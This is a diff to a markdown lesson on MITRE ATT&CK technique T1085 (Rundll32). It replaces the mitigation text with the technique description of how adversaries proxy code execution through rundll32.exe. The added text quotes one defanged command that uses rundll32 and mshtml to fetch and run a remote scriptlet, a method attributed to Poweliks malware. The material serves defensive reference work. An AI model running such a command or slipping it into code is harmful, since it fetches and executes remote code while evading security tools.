@@ -1,10 +1,12 @@
-# T1085 Rundll32 Mitigation Outcome Lesson
+# T1085 Rundll32 Outcome Lesson
 
 ## Authoritative description
 
-- Technique: **T1085 — Rundll32 Mitigation**
+- Technique: **T1085 — Rundll32**
+- Tactics: stealth, execution
+- Platforms: Windows
 
-Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.
+The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations. Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks.
 
 ## Reusable lesson
 
@@ -21,7 +23,7 @@ This technique should be treated as an explicit review question when it is relev
 ## Source
 
 - MITRE ATT&CK: https://attack.mitre.org/
-- T1085: https://attack.mitre.org/mitigations/T1085
+- T1085: https://attack.mitre.org/techniques/T1085
 - Reviewed: 2026-10-27
 
 ## Boundary
